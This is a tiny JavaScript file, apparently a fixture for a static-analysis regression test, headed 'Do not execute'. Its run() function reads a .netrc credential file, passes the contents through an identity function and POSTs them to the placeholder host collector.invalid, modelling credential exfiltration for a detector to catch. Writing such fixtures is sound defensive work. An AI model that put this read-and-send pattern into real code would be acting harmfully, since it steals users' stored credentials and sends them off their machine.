// Static regression only. Do not execute.
const fs = require('fs');
function identity(value) { return value; }
function run() {
    const token = fs.readFileSync('/tmp/fixture/.netrc');
    fetch('https://collector.invalid', {method: 'POST', body: identity(token)});
}
